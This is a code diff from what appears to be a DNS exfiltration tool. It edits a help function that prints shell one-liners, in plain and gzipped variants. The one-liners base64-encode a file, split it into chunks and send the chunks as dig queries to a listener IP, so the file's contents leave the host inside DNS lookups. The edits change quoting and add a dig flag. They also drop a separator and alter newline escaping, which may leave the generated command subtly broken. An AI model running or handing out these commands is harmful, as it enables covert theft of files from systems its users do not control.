@@ -243,24 +243,24 @@ def save_received_files(files: Dict[str, List[bytes]], output_dir: Path, decompr
 
 
 def help_text(listen_ip: str, s: int, b: int) -> str:
-    encoded_filename_example = "$(echo -ne $f | base64 -w0 | tr -d '=')"
+    encoded_filename_example = "$(echo -ne \"$f\" | base64 -w0 | tr -d '=')"
 
     plain = (
         f"f=file.txt; s={s}; b={b}; c=0; "
-        f"for r in $(for i in $(base64 -w0 $f | sed \"s/.\\{{$b\\}}/&\\n/g\"); "
+        f"for r in $(for i in $(base64 -w0 \"$f\" | sed \"s/.\{{$b\}}/&\n/g\"); "
         f"do if [[ \"$c\" -lt \"$s\" ]]; then echo -ne \"$i-.\"; c=$(($c+1)); "
-        f"else echo -ne \"\\n$i-.\"; c=1; fi; done); "
-        f"do dig @{listen_ip} +short +retries=0 +tries=1 "
-        f"$r.{encoded_filename_example}.$RANDOM.zz; done"
+        f"else echo -ne \"\n$i-.\"; c=1; fi; done); "
+        f"do dig +noidnin @{listen_ip} +short +retries=0 +tries=1 "
+        f"\"$r{encoded_filename_example}.$RANDOM.zz\"; done"
     )
 
     zipped = (
         f"f=file.txt; s={s}; b={b}; c=0; "
-        f"for r in $(for i in $(gzip -c $f | base64 -w0 | sed \"s/.\\{{$b\\}}/&\\n/g\"); "
+        f"for r in $(for i in $(gzip -c \"$f\" | base64 -w0 | sed \"s/.\{{$b\}}/&\n/g\"); "
         f"do if [[ \"$c\" -lt \"$s\" ]]; then echo -ne \"$i-.\"; c=$(($c+1)); "
-        f"else echo -ne \"\\n$i-.\"; c=1; fi; done); "
-        f"do dig @{listen_ip} +short +retries=0 +tries=1 "
-        f"$r.{encoded_filename_example}.$RANDOM.zz; done"
+        f"else echo -ne \"\n$i-.\"; c=1; fi; done); "
+        f"do dig +noidnin @{listen_ip} +short +retries=0 +tries=1 "
+        f"\"$r{encoded_filename_example}.$RANDOM.zz\"; done"
     )
 
     return f"""
